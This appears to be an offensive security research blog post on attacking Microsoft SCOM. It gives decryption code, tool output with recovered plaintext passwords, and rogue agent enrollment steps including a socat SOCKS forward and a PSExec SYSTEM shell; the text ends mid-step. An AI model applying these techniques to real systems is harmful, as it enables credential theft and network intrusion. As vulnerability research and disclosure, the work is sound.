<!doctype html><html lang=en dir=auto data-theme=dark><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SCOMmand And Conquer - Attacking System Center Operations Manager |</title><meta name=keywords content><meta name=description content="Introduction
With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.
Additionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as SCCM and Symantec Management Agent))."><meta name=author content="Matt Johnson"><link rel=canonical href=https://breakfix.co/posts/scommand-and-conquer---attacking-system-center-operations-manager/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.7dffa467ed2caf12b1371c26b29262254b90390e9b746ee6615f35700c6d8ec6.css integrity="sha256-ff+kZ+0srxKxNxwmspJiJUuQOQ6bdG7mYV81cAxtjsY=" rel="preload stylesheet" as=style><link rel=icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://breakfix.co/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://breakfix.co/posts/scommand-and-conquer---attacking-system-center-operations-manager/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="light"&&(document.querySelector("html").dataset.theme="light")</script><meta property="og:url" content="https://breakfix.co/posts/scommand-and-conquer---attacking-system-center-operations-manager/"><meta property="og:site_name" content=" "><meta property="og:title" content="SCOMmand And Conquer - Attacking System Center Operations Manager"><meta property="og:description" content="Introduction With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.
Additionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as SCCM and Symantec Management Agent))."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-27T07:58:57+11:00"><meta property="article:modified_time" content="2025-12-27T07:58:57+11:00"><meta property="og:image" content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SCOMmand And Conquer - Attacking System Center Operations Manager"><meta name=twitter:description content="Introduction
With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.
Additionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as SCCM and Symantec Management Agent))."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://breakfix.co/posts/"},{"@type":"ListItem","position":2,"name":"SCOMmand And Conquer - Attacking System Center Operations Manager","item":"https://breakfix.co/posts/scommand-and-conquer---attacking-system-center-operations-manager/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SCOMmand And Conquer - Attacking System Center Operations Manager","name":"SCOMmand And Conquer - Attacking System Center Operations Manager","description":"Introduction With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.\nAdditionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as SCCM and Symantec Management Agent)).\n","keywords":[],"articleBody":"Introduction With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.\nAdditionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as SCCM and Symantec Management Agent)).\nIf we could leverage a similar attack to enroll an arbitrary agent with SCOM, we could potentially access agent policy data and any sensitive data stored within it. Hence, we set forth to understand the SCOM agent enrollment process, how authentication was performed, and how credentials were distributed to agents.\nWe found that credentials could be obtained using this technique in certain configurations and wrote a tool to help automate their recovery. To skip straight to the tool, go here https://github.com/breakfix/SharpSCOM\nRunAs Credentials Overview Before diving into the SCOM agent protocol itself, here is a quick summary of why we as attackers might be interested in focusing our attention on it in the first place.\nIn order to extend the monitoring capabilities of SCOM, additional credentials (referred to as RunAs credentials) can be added to be used with specific monitoring tasks. This is especially useful when authenticating to an external service to retrieve monitoring data — for example, an MSSQL database that requires database-level authentication via a sa account.\nThese RunAs credentials are stored in the SCOM management server database as well as directly on any hosts which they have been distributed to.\nNote: Some excellent existing research by Rich Warren of NCC group has been done into extraction of RunAs credentials stored in the SCOM database here along with a tool for decryption. Rich’s research focuses on extracting credentials from a compromised SCOM database server. The focus of this blog post is on RunAs credential recovery from managed hosts themselves.\nRunAs credentials are associated with a RunAs Profile which defines how and where the credentials are distributed. When creating a new RunAs credential, administrators are presented with two options, More Secure and Less Secure.\nBased on the names of each option, it should be clear which option provides the best security. When selecting the Less secure option, the RunAs credential distributes to all enrolled devices. Conversely, More secure will only distribute RunAs credentials to specific hosts or groups we specify, limiting their exposure. Despite this, RunAs credentials may be configured with the Less secure option to reduce administrative overhead.\nWhen these credentials are distributed to an enrolled agent, the required RunAs credentials are retrieved from the SCOM management database, encrypted with the agent’s public key, and sent back to agent in the policy configuration file. The below high-level diagram illustrates the distribution of RunAs credentials to an enrolled agent.\nWith an understanding on how these credentials are sent to the agent, we looked to see what options were available to us for recovery of these credentials.\nRunAs Credential Recovery On-Host Recovery via Registry In the event we manage to compromise a server which is already enrolled in SCOM, we can attempt to decrypt any RunAs credentials stored on the machine directly. If RunAs credentials are in use and have been distributed to the agent, they will be stored in the registry at the below location HKLM\\SYSTEM\\CurrentControlSet\\Services\\HealthService\\Parameters\\Management Groups\\$MANAGEMENT_GROUP$\\SSDB\\SSIDs\\*.\nObserving the header bytes of these registry entires 01 00 00 00 D0 8C 9D suggested that our good friend DPAPI was likely at play here. Passing the binary value to SharpDPAPI confirmed this by parsing the structure and showing the master key GUID needed for decryption.\nC:\\Users\\da\\Downloads\u003eSharpDPAPI.exe blob /target:\u003cTRIMMED_FOR_BREVITY\u003e __ _ _ _ ___ (_ |_ _. ._ ._ | \\ |_) /\\ |_) | __) | | (_| | |_) |_/ | /--\\ | _|_ | v1.11.1 [*] Action: Describe DPAPI blob guidMasterKey : {90226a7d-5440-4498-8631-8b8f39292ebc} size : 1318 flags : 0x14 algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256) description : [X] MasterKey GUID not in cache: {90226a7d-5440-4498-8631-8b8f39292ebc} However, our attempts to decrypt these blobs by providing the GUID:SHA1 values required did not result in credentials as expected.\nC:\\Users\\da\\Downloads\u003eSharpDPAPI.exe blob /target:\u003cTRIMMED_FOR_BREVITY\u003e {90226a7d-5440-4498-8631-8b8f39292ebc}:EEF09F0F62C03E67D419A21812253B9F8D4B9257 __ _ _ _ ___ (_ |_ _. ._ ._ | \\ |_) /\\ |_) | __) | | (_| | |_) |_/ | /--\\ | _|_ | v1.11.1 [*] Action: Describe DPAPI blob guidMasterKey : {90226a7d-5440-4498-8631-8b8f39292ebc} size : 1318 flags : 0x14 algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256) description : dec(blob) : F7 B9 79 E3 38 BB 4D 46 07 8F C9 A1 EF 98 5B 44 36 BC CA 3A 7D B7 DB 15 33 31 70 8D F1 89 A8 A2 85 61 6A E6 AA 9B 27 6A EE B8 B9 7F B4 D3 EC 93 E4 8D 5B AE E2 66 62 12 18 63 98 E4 5F 6D 57 DA 8E BF 4A C5 06 17 37 21 B0 DD 82 F3 29 79 89 F8 Although the SCOM agent is a native binary, many of the server-side components on the SCOM server are written in .NET, allowing for decompilation. Searching the decompiled server binaries for references to DPAPI, we located the method Encrypt inside the DPAPIWrapper.cs class within the Microsoft.EnterpriseManagement.DataAccessService.Core.dll dynamic link library (DLL).\nHere, we observe a random data buffer being allocated prior to the call to CryptProtectData.\nRandom random = new Random(); byte[] array = new byte[1024]; random.NextBytes(array); Marshal.Copy(array, 0, data_BLOB3.pbData, 1024); This data buffer is then provided as the third argument to the CryptProtectData call.\nif (!DPAPIWrapper.CryptProtectData(ref data_BLOB, \"\", ref data_BLOB3, IntPtr.Zero, ref cryptprotect_PROMPTSTRUCT, num2, ref data_BLOB2)) { throw new Win32Exception(Marshal.GetLastWin32Error()); } Reviewing the documentation, we see this corresponds to the OptionalEntropy argument.\nAfter the call to CryptProtectData, this random data is then appended to the encrypted data to form the final blob.\nSpecial thanks to our resident DPAPI master Lee Chagolla-Christensen for helping us work this out!\nWith this discovery, we added logic to perform the correct decryption by extracting the entropy data from the blob into our C# based tool SharpSCOM. If we have local admin rights and RunAs credentials are distributed to the endpoint, we will recover them in plaintext.\nPS C:\\Users\\domainadmin\u003e .\\SharpSCOM.exe DecryptRunAs █▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█ ▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █ Author: Matt Johnson - SpecterOps - v0.0.1 [+] Searching for RunAs credentials within the registry... [+] Found 3 credentials [+] Username: ludus\\opsmgr_action Password: Password123 [+] Username: ludus\\opsmgr_dataread Password: Password123 [+] Username: ludus\\opsmgr_datawrite Password: Password123 Recovery via Policy File An alternative option to using DPAPI is to decrypt the the RunAs credentials directly from the agent policy file itself. When the agent receives its initial policy configuration file, the policy XML data is written to disk at the below location C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\Connector Configuration Cache\\$MANAGEMENT_GROUP$\\OpsMgrConnector.Config.\nOf particular interest to us is the SecureData section of the policy shown below.\nIf RunAs credentials are distributed to the endpoint, they will be included within the SecureData section encrypted with the agent’s public key (stored on the SCOM management server). The corresponding agent private key is stored on the agent in the local certificate store under Local Computer\\Microsoft Monitoring Agent.\nAs an alternative to DPAPI decryption, we can reference this certificate and use the associated private key to decrypt the SecureData section of the policy. All that is required it to determine the algorithm used for encryption.\nSearching the decompiled server binaries for references to encryption, we located the method EncryptBytes inside the RootConnectorMethods.cs Class within the Microsoft.EnterpriseManagement.RuntimeService.dll DLL.\npublic static byte[] EncryptBytes(byte[] certificateBlob, byte[] message) { byte[] array3; try { if (TraceHelper.traceProvider.Level \u003e= 6 \u0026\u0026 (TraceHelper.traceProvider.Flags \u0026 256) != 0) { WPP_1d8ce350b791d902da3ec4db6c045231.WPP_NOARGS(5, 36); } uint num = BitConverter.ToUInt32(certificateBlob, 0); byte[] array = new byte[certificateBlob.Length - 4]; Array.Copy(certificateBlob, 4, array, 0, array.Length); X509Certificate2 x509Certificate = new X509Certificate2(array); if (num != 26128U) { if (TraceHelper.traceProvider.Level \u003e= 3 \u0026\u0026 (TraceHelper.traceProvider.Flags \u0026 1) != 0) { WPP_1d8ce350b791d902da3ec4db6c045231.WPP_uss(5, 37, num, TraceProvider.MakeStringArg(x509Certificate.Subject), TraceProvider.MakeStringArg(x509Certificate.SerialNumber)); } num = 26128U; } using (SymmetricAlgorithm symmetricAlgorithm = SymmetricAlgorithm.Create(\"AES\")) { symmetricAlgorithm.KeySize = 256; symmetricAlgorithm.BlockSize = 128; symmetricAlgorithm.Mode = CipherMode.CBC; symmetricAlgorithm.IV = new byte[symmetricAlgorithm.BlockSize / 8]; using (ICryptoTransform cryptoTransform = symmetricAlgorithm.CreateEncryptor()) { byte[] array2 = new RSAPKCS1KeyExchangeFormatter(x509Certificate.PublicKey.Key).CreateKeyExchange(symmetricAlgorithm.Key, symmetricAlgorithm.GetType()); using (MemoryStream memoryStream = new MemoryStream()) { using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream)) { binaryWriter.Write(12 + array2.Length); binaryWriter.Write(1); binaryWriter.Write(2); binaryWriter.Write(0); binaryWriter.Write(0); binaryWriter.Write(num); binaryWriter.Write(41984U); Array.Reverse(array2); binaryWriter.Write(array2, 0, array2.Length); binaryWriter.Flush(); using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write)) { cryptoStream.Write(message, 0, message.Length); cryptoStream.FlushFinalBlock(); } array3 = memoryStream.ToArray(); } } } } } This function will read the agent certificate from the SCOM database as certificateBlob, and use the associated public key to encrypt the SecureData section of the policy. Although we don’t have access to decompiled code responsible for decryption (as this is performed by the agent in the native SCOM binaries), implementing a corresponding decryption routine for this function is straightforward.\nusing System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; public byte[] DecryptWithCertificate(byte[] encryptedData, string certSubjectName) { // Open the Local Machine certificate store X509Store store = new X509Store(StoreName.My, StoreLocation.LocalMachine); store.Open(OpenFlags.ReadOnly); try { // Find certificate by subject name X509Certificate2Collection certs = store.Certificates.Find( X509FindType.FindBySubjectName, certSubjectName, false); // false = include invalid certs if (certs.Count == 0) throw new Exception($\"Certificate '{certSubjectName}' not found\"); X509Certificate2 cert = certs[0]; // Verify private key is available if (!cert.HasPrivateKey) throw new Exception(\"Certificate does not have a private key\"); // Get RSA private key using (RSA rsa = cert.GetRSAPrivateKey()) { // Decrypt data byte[] decryptedData = rsa.Decrypt(encryptedData, RSAEncryptionPadding.Pkcs1); return decryptedData; } } finally { store.Close(); } } We can then add this functionality into SharpSCOM which will automatically locate the RunAs certificate from the Microsoft Monitoring Agent store and use this to decrypt the SecureData blob.\nPS C:\\Users\\domainadmin\\Documents\u003e .\\SharpSCOM.exe decryptpolicy /data:DAEAAAECAAAQZgAAA\u003cTRIMMED FOR BREVITY\u003e █▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█ ▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █ Author: Matt Johnson - SpecterOps - v0.0.1 [+] Found certificate in Microsoft Monitoring Agent store [+] Subject: O=Microsoft, OU=RunAs Account Encryption, CN=DC01.ludus.domain [+] Issuer: O=Microsoft, OU=RunAs Account Encryption, CN=DC01.ludus.domain [+] Thumbprint: 962D0B73F8F7040C3C579C0CC5262EA582A8B218 [+] Key Container: a7234bac-3179-4607-ba67-8f6143c9344e [+] Provider: Microsoft Software Key Storage Provider [+] Key Size: 2048 [+] RSA key loaded successfully from certificate \u003cSecureStorageContainer\u003e\u003cSecureStorageReferences\u003e\u003cAdded /\u003e\u003cRemoved /\u003e\u003cModified /\u003e\u003c/SecureStorageReferences\u003e\u003cSecureStorageElements\u003e\u003cAdded\u003e\u003cSecureStorageElement Type=\"WindowsCredential\"\u003e\u003cSSID\u003e00C29753F0583B2A1D9D0D81DF24F0FBA31D72B17A00000000000000000000000000000000000000\u003c/SSID\u003e\u003cDomain\u003eludus\u003c/Domain\u003e\u003cUserName\u003erunas_account\u003c/UserName\u003e\u003cPassword\u003eUwB1AHAAZQByAFMAZQBjAHUAcgBlACEA\u003c/Password\u003e\u003c/SecureStorageElement\u003e\u003c/Added\u003e\u003cRemoved /\u003e\u003cModified /\u003e\u003c/SecureStorageElements\u003e\u003c/SecureStorageContainer\u003e But wait, what is this UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA value in the Password field ? Is there yet more encryption to reverse ? Luckily for us, no, it’s just Base64.\necho UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA | base64 -d SuperSecure!% RunAs Credential Recovery Off-Host While the above methods for on-host credential recovery are useful, we wanted to see what could be done from a host not currently enrolled in SCOM.\nThis is useful for scenarios where we know SCOM is in use within the environment but we don’t have access to a machine which is enrolled in SCOM. Although SCOM is designed for monitoring of servers, there is no technical limitation stopping us from enrolling any domain joined machine (such as a user’s workstation) if it can be approved.\nAgent Enrollment Approval If we wish to enroll our own agent in SCOM, we need to understand the available security controls around enrollment.\nSCOM allows management agents to be deployed via two methods: push based installation (via the agent discovery wizard) and manual installation. For push based installation, a new discovery scan is first initiated via the SCOM management console.\nOnce a new host is discovered, the SCOM server requires a direct connection to the target machine over SMB/RPC in order to install the SCOM management agent. After installation, the agent will communicate via the dedicated agent communication port 5723/TCP.\nIn modern environments, a firewall typically blocks this type of direct access, so instead admins may opt for manual installation.\nWith manual installation, the management agent MSI installer MOMAgent.msi is run directly on the host to perform the enrollment process. By default, any agents installed via this method will be automatically rejected by the SCOM management server.\nIn order to allow manual enrollments, this setting must be changed to either place manual agent installations in a pending state and manually approve them or to automatically approve them.\nIf selecting manual approval, admins may find this setting overly restrictive, especially when enrolling a large number of hosts. Requiring manual approval in this case is simply not practical, and admins may opt to instead allow automatic approval.\nWe have often observed real world configurations where this default setting has been modified to automatically approve manually installed agents. Indeed, many online guides will suggest modifying this setting to allow automatic approval.\nEnrolling Our Own Agent In the event automatic approval has been enabled, we can seek to enroll our own agent with the below methods. One additional requirement for this is knowledge of the SCOM management group name which we wish to join our agent to. This is stored in the registry at the below path HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\HealthService\\Parameters\\Management Groups\\* on any machines already enrolled in SCOM.\nAnother common location to find references to the management group is in file shares (such as SCCM distribution groups) containing post build configuration scripts (.bat, .ps1 etc). As the management group name is provided as an argument to the SCOM agent MSI installer, it’s not uncommon to find references to these within install scripts on the network.\n@echo off :setup msiexec.exe /i %current%amd64\\MOMAgent.msi /qn USE_SETTINGS_FROM_AD=0 USE_MANUALLY_SPECIFIED_SETTINGS=1 MANAGEMENT_GROUP=CLIENTMGRP1 MANAGEMENT_SERVER_DNS=SCOM.CLIENT.LOCAL MANAGEMENT_SERVER_AD_NAME=SCOM.CLIENT.LOCAL AcceptEndUserLicenseAgreement=1 If Active Directory integration is enabled, then the management group name will be stored under the OperationsManager container.\nWith knowledge of the management group name, we can perform the below steps to enroll our agent.\nCertificate Based Enrollment via SOCKS Proxy As is often the case when attempting to perform a new attack, we asked ourselves the age-old question: “Will it proxy?”\nIndeed, all of the SCOM agent communications occur over a single TCP port (5723/TCP), so setting up a simple single port forward via SOCKS is straightforward. Where things get complicated is trying to trick the SCOM agent into enrolling from a machine not joined to the domain.\nBefore we dive in, let’s go over the requirements we need to perform the attack. We should also note that if our goal is to recover RunAs credentials, these will need to be configured with the Less Secure option.\nRequirements In order to enroll an agent in SCOM via certificates, we require:\nAutomatic agent approval to be enabled Knowledge of the SCOM Management Group name A machine certificate suitable for authentication (more on this below) Network connectivity to SCOM server on TCP port 5723 Scenerio In this scenario, we assume we have compromised a user’s workstation which does not currently have the SCOM agent installed. Remember, this is likely to be the case as SCOM is typically only used for server monitoring. Assuming we can reach the SCOM server on port 5723 from this workstation we can setup our SOCKS proxy to forward this port back to our local Windows attacker virtual machine (VM).\nThe below diagram illustrates the scenario setup.\nAttacker VM Setup To satisfy the SCOM agent, we need to configure our attacker VM to match the compromised workstation as closely as possible. This requires we:\nSet the server name to match the victim workstation we are impersonating Promote the server to a domain controller, setting the Active Directory name to match the victim domain Import the Certificate Authority (CA) certificates from the victim workstation and add them to the trusted root store Certificate Setup In order to authenticate against the SCOM server using certificates, we need to first ensure we have access to a certificate issued to our victim workstation that is suitable for use with SCOM. Although most documentation online suggests creating a new template in ADCS for SCOM specifically, the only requirements are the below Extended Key Usages (EKUs).\nClient Authentication Server Authentication As a result, the default machine template in ADCS will do us just fine. The only requirement is that the subject name contains the computer name of our victim workstation.\nIn order for the SCOM agent to trust the SCOM server, we will also need to recover the certificates for the internal CA servers and add them to the trusted root authorities of our VM.\nTo do this, a simple C# assembly can be used to export certificates from the trust store of the Beacon machine:\nC:\\Users\\mattjohnson\\CertExtract.exe Searching in store: AddressBook No certificates found containing the substring 'DC' in their subject names in the AddressBook store. Searching in store: AuthRoot No certificates found containing the substring 'DC' in their subject names in the AuthRoot store. Searching in store: CertificateAuthority Certificate Subject: CN=CA-02, DC=CLIENT, DC=LOCAL Base64 Encoded Certificate: MIIEOD...\u003cSNIP\u003e We can then install the machine certificate into the Local Machine Personal store. After installing the CA certificates, we confirm we now have a chain of trust setup linking back to the internal root CAs.\nIn order to tell the SCOM agent which certificate to use for authentication, we run MomCertImport.exe and select the machine certificate we imported.\nAs a final validation, we can use this handy PowerShell script to confirm our certificates and chain of trust are setup correctly. If all is done right, we should see something similar to the below output.\nPerforming the Enrollment via SOCKS With our certificates installed correctly, we can setup our SOCKS proxy and use socat to create a port forward to route traffic to the SCOM server.\nsocat TCP4-LISTEN:5723,fork SOCKS4:127.0.0.1:10.0.0.25:5723,socksport=9000 We will also need to add a host file entry for the SCOM server hostname pointing at our SOCKS server IP address.\nFinally, we can restart the SCOM agent service and perform the device enrollment. We can then check the EventLogs to confirm the enrollment status.\nPerforming this attack for the first time in the field, we saw the below error.\nThis indicated the SCOM Agent (not server) could not validate the certificate chain. It turns out the SCOM agent must be able to verify the Certificate Revocation List (CRL) contained within the SCOM Server certificate when it’s presented to the agent.\nLuckily, the CRL is fetched over HTTP, which allows us to passively discover the hostname of the machine hosting the CRL with Wireshark. Then we just need to add this hostname to our VM hosts file and setup a HTTP listener to reply with an HTTP 200 (i.e., “OK”) response to the CRL request. When we restart the agent, we see the requests for the CRL.\nmattjohnson@XPS-15-7590:/tmp$ sudo python2.7 -m SimpleHTTPServer 80 [sudo] password for mattjohnson: Serving HTTP on 0.0.0.0 port 80 ... 192.168.1.154 - - [04/Apr/2024 17:43:48] code 404, message File not found 192.168.1.154 - - [04/Apr/2024 17:43:48] \"GET /CERT001-CA.crl HTTP/1.1\" 404 - 192.168.1.154 - - [04/Apr/2024 17:43:48] code 404, message File not found 192.168.1.154 - - [04/Apr/2024 17:43:48] \"GET /CERT001-CA.crl HTTP/1.1\" 404 - 192.168.1.71 - - [04/Apr/2024 17:45:09] code 404, message File not found Sending an HTTP 200 response for the CRL to the agent allowed the certificate validation to pass. Restarting the agent again, we saw a successful enrollment message in the EventLogs.\nAt this stage, the SCOM agent will begin to pull down the policy configuration file over 5723/TCP via our SOCKS proxy. By monitoring for the creation of any new DPAPI encrypted entries under the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\HealthService\\Parameters\\$MANAGEMENT_GROUP$\\SCOM1\\SSDB\\SSIDs\\* registry key, we can determine if any RunAs credentials are in use.\nWe can then use any of the previously discussed methods to recover any RunAs credentials stored either in the policy or in the registry.\nPS C:\\Users\\domainadmin\u003e .\\SharpSCOM.exe DecryptRunAs █▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█ ▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █ Author: Matt Johnson - SpecterOps - v0.0.1 [+] Searching for RunAs credentials within the registry... [+] Found 3 credentials [+] Username: ludus\\opsmgr_action Password: Password123 [+] Username: ludus\\opsmgr_dataread Password: Password123 [+] Username: ludus\\opsmgr_datawrite Password: Password123 Kerberos Enrollment via C# Due to the amount of setup required to perform the above attack, we looked to develop our own C# based tool to perform the enrollment requests made by the SCOM agent ourselves. As we had previously focused on using certificates for authentication via SOCKS, we decided this time to focus on Kerberos authentication.\nIn order to do this, we needed to perform reverse engineering of the SCOM agent process HealthService.exe as well as the proprietary network protocol used to speak with the SCOM server.\nRequirements In order to enroll an agent in SCOM via Kerberos, we require:\nAutomatic agent approval to be enabled Knowledge of the SCOM Management Group name Ability to perform Kerberos Authentication as a domain computer account Agent Communications Reviewing the documentation, we can see that the agent traffic we are interested in is sent over port 5723/TCP.\nRunning Wireshark and filtering on this port, we can see a flurry of requests come in after restarting the agent service.\nAt first glance, the agent traffic appears encrypted with no hints as to how the data is structured. Following the TCP stream, we can locate the first packet sent by the agent to the server (identified by the presence of the MOM ASCII bytes).\nAccording to the documentation, if we do not currently have any certificates installed, the agent will default to using Kerberos for authentication. We can confirm this by identifying the 06 09 2a 86 48 86 f7 12 01 02 02 bytes in the initial request sent to the server. This corresponds to the Object Identifier (OID) for GSS-API Kerberos v5 (1.2.840.113554.1.2.2).\nTo quickly parse out the Kerberos data in Wireshark, we can extract these bytes (starting from 60 82, base64 encode them and wrap them in a HTTP Negotiate authorization header.\ncurl -i -H \"Authorization: Negotiate YIIG1wYJKoZIhvcSAQ\" \u003chttp://192.168.1.107:8000\u003e We can then use curl to send a dummy request to a Python web server while running Wireshark. Wireshark will then parse out the HTTP authorization header and apply it’s Kerberos v5 protocol dissector on the data.\nHere, we see Wireshark has correctly identified the GSS-API data and can see the SCOM Kerberos service name MSOMHSvc.\nAfter authentication finishes, the rest of the agent traffic appears to be encrypted.\nAnalysing the encrypted data, we notice the bytes 05 04 present in the data that both the agent and server sent.\nThis corresponds to a Kerberos GSS-API Wrap token as documented in the RFC here.\nThe Windows SSPI equivalent to the GSS_Wrap function is EncryptMessage.\nAs both the client and server have knowledge of a shared secret (the Kerberos session key), they can use this to encrypt any additional application data via a call to EncryptMessage.\nNow that we know how the SCOM agent traffic is encrypted, the challenge then becomes how best to decrypt it so that we can begin to construct our own client.\nAgent Data Encryption After exploring many different options to decrypt the agent traffic, we decided to try and implement our own basic SCOM server to intercept messages that the legitimate SCOM agent generated.\nBased on the observations made from the captured agent traffic, we made an educated guess that Windows SSPI with the Kerberos Security Support Provider was likely the authentication API in use.\nLooking for a quick win and wanting to avoid diving directly into IDA, we created a simple SSPI client and server that would perform authentication via Kerberos. We could send some sample encrypted messages and capture the network traffic with Wireshark. Finally, we could then overlay the traffic generated from our client and compare it to the traffic captured from the legitimate SCOM agent.\nTo ensure the data aligned as closely as possible, we opted to not utilise any builtin .NET libraries which provide further abstractions on top of SSPI (such as NegotiateStream). Rather, we made use of the amazing public library nsspi which provides access to the SSPI directly from C# via pinvoke.\nThe C# code for the sample client can be seen below.\nusing (TcpClient tcpClient = new TcpClient(server, port)) using (NetworkStream networkStream = tcpClient.GetStream()) using (ClientCurrentCredential clientCred = new ClientCurrentCredential(PackageNames.Kerberos)) using (ClientContext client = new ClientContext(clientCred, $\"MSOMHSvc/{server}\", ContextAttrib.MutualAuth | ContextAttrib.Confidentiality)) { // Authenticate client.Init(null, out byte[] clientToken); networkStream.Write(generate_ap_req(clientToken), 0, clientToken.Length); byte[] apRep = parse_ap_rep(networkStream); while (client.Init(apRep, out clientToken) == SecurityStatus.ContinueNeeded) { } // Encrypt and send message byte[] plainText = Encoding.UTF8.GetBytes(\"Hello, world!\"); byte[] encrypted = client.Encrypt(plainText); networkStream.Write(encrypted), 0, encrypted.Length); // Receive and decrypt response byte[] encryptedResponse = parse_kerb_wrap_token(networkStream); byte[] decrypted = client.Decrypt(encryptedResponse); string response = Encoding.UTF8.GetString(decrypted); Console.WriteLine($\"Response: {response}\"); } Along with the corresponding server code.\nusing (TcpClient tcpClient = new TcpClient(server, port)) using (NetworkStream networkStream = tcpClient.GetStream()) using (ClientCurrentCredential clientCred = new ClientCurrentCredential(PackageNames.Kerberos)) using (ClientContext client = new ClientContext( clientCred, $\"MSOMHSvc/{server}\", ContextAttrib.MutualAuth | ContextAttrib.Confidentiality | ContextAttrib.Delegate)) { // Initial authentication - generate AP-REQ client.Init(null, out byte[] clientToken); byte[] apReq = generate_ap_req(clientToken); // Send AP-REQ networkStream.Write(apReq, 0, apReq.Length); networkStream.Flush(); // Receive and parse AP-REP byte[] apRep = parse_ap_rep(networkStream); // Complete authentication SecurityStatus status; do { status = client.Init(apRep, out clientToken); } while (status == SecurityStatus.ContinueNeeded); // Authentication complete - context established Console.WriteLine($\"Authenticated as: {client.ContextUserName}\"); Console.WriteLine($\"Session Key: {BitConverter.ToString(client.QuerySessionKey())}\"); } We then ran our Kerberos SSPI server on port 5000/TCP and connected our client.\nAfter some tweaking of the message encryption parameters, we captured the below encrypted data in Wireshark.\nThis was promising, as the structure of the generated traffic and encrypted application data was almost identical to that sent by the legitimate SCOM agent below.\nWe say “almost” identical as there was a subtle variance in the order of the first few bytes of the Kerberos wrap tokens due to the Right Rotation Count (RRC).\nWith the correct authentication protocol identified, we could then point the legitimate SCOM agent against our own Kerberos SSPI server. Once authentication succeeds, we can decrypt the Kerberos wrap token containing the initial agent request data.\nIn order for the SCOM client to authenticate via Kerberos against our SSPI server, it must be running under the security context of the account the SCOM SPN MSOMHSvc is registered with. We can confirm this by running the below command on our lab DC.\nC:\\Users\\domainadmin\u003esetspn -Q MSOMHSvc/scom-om1.ludus.domain Checking domain DC=ludus,DC=domain CN=SCOM-OM1,OU=Servers,DC=ludus,DC=domain WSMAN/scom-om1 WSMAN/scom-om1.ludus.domain MSOMHSvc/SCOM-OM1 MSOMHSvc/scom-om1.ludus.domain MSOMSdkSvc/SCOM-OM1 MSOMSdkSvc/scom-om1.ludus.domain TERMSRV/SCOM-OM1 TERMSRV/scom-om1.ludus.domain RestrictedKrbHost/SCOM-OM1 HOST/SCOM-OM1 RestrictedKrbHost/scom-om1.ludus.domain HOST/scom-om1.ludus.domain Existing SPN found! In this instance, we need to spawn a process running as scom-om1$. We can achieve this by spawning a SYSTEM shell using PSExec on the scom-om1.ludus.domain host.\nC:\\Users\\domainadmin\u003ehostname scom-om1 